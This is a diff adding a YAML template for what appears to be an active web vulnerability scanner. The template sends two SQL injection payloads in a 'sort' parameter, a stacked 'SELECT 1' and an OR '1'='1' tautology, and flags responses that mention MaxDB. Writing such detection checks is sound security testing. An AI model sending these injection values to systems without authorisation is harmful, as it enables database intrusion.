@@ -1,0 +1,21 @@
+id: sqli2-maxdb-12
+name: 'SQLi error maxdb via sort'
+severity: high
+type: active
+tags:
+  - sqli
+  - injection
+  - maxdb
+description: 'Triggers maxdb error via sort'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      sort:
+        - '''; SELECT 1--'
+        - ''' OR ''1''=''1'
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'MaxDB'
